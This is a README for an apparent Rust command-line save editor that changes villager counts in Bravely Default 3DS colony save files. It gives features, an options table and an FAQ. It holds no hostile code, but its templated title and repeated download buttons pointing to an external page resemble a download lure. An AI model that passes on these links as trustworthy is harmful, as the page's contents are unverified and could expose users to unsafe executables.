# Bravely Devillage v - Game Script Utility 2026

> A cross-platform CLI save editor for Bravely Default on 3DS. It is centered on villager count adjustments and working with the game's save files through a compact command-line flow.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-cross-platform-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/carterkevinazsn6309/bravely-devillage-save-cli?style=flat-square)](https://github.com/carterkevinazsn6309/bravely-devillage-save-cli)

---

<p align="center">
  <a href="https://carterkevinazsn6309.github.io/bravely-devillage-save-cli/">
    <img src="https://img.shields.io/badge/Download-Bravely%20Devillage%20Script-brightgreen?style=for-the-badge" alt="Download Bravely Devillage Script">
  </a>
</p>

> **[Direct Download - Bravely Devillage](https://carterkevinazsn6309.github.io/bravely-devillage-save-cli/)**

---

[Download Latest Build](https://carterkevinazsn6309.github.io/bravely-devillage-save-cli/)

---

## What It Does

Bravely Devillage is a Rust command-line save editor made for Bravely Default on 3DS. Its main job is villager count editing, giving users a straightforward way to inspect and modify save data without relying on a GUI application.

The tool is meant to run on Windows, Linux, and macOS. It handles the Bravely Default colony save files, including COLONY0.sav, COLONY1.sav, and COLONY2.sav, and fits into a local save backup and restore routine for 3DS users.

---

## Script Features

- Edits villager counts in Bravely Default save files
- Targets Bravely Default for Nintendo 3DS
- Command-line interface for quick local use
- Built with Rust for cross-platform support
- Runs on Windows, Linux, and macOS
- Modifies COLONY0.sav, COLONY1.sav, and COLONY2.sav in place
- Supports 3DS save backups and restores
- Includes a browser-based save editor option

---

## Setup

1. Download the latest build from the project release link.
2. Extract the files to a folder on your computer.
3. Place your Bravely Default save backup where the tool can access it.
4. Run the CLI tool from a terminal and point it at the save file you want to edit.

Example usage:

    bravely-devillage --help

When editing one of the colony save files directly, keep a backup copy first so you can verify the changes or roll back to the original data if necessary.

---

## Options

Common command-line usage includes choosing a file and setting a villager count.

| Option | Purpose |
| --- | --- |
| `--help` | Show available commands and flags |
| `--input <file>` | Choose the save file to open |
| `--output <file>` | Write changes to a separate file |
| `--count <value>` | Set the villager count value |
| `--backup` | Create a backup before editing |

Example:

    bravely-devillage --input COLONY0.sav --count 25 --backup

---

## Compatibility

Bravely Devillage is intended for Bravely Default 3DS save data and is available on Windows, Linux, and macOS. It focuses on the colony save files named COLONY0.sav, COLONY1.sav, and COLONY2.sav.

As with any save editor, the outcome depends on the exact file format and the specific save copy you provide. Use it with the proper backup or restore files in your own workflow, and do not mix unrelated saves.

---

## FAQ

### How do I use it?
Open a terminal, point the tool at the save file, and apply the villager count change you want.

### Does it work on my operating system?
Yes, the project is cross-platform and is intended to run on Windows, Linux, and macOS.

### Which game is this for?
It is made for Bravely Default on Nintendo 3DS.

### Can I edit more than one save file?
The tool works with COLONY0.sav, COLONY1.sav, and COLONY2.sav, so you can select the file that matches your save data.

### Is there a browser-based option?
Yes, a browser-based save editor is listed as available alongside the CLI workflow.

### Should I keep backups?
Yes. Keeping a backup before editing is a practical way to preserve the original save copy and compare results afterward.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
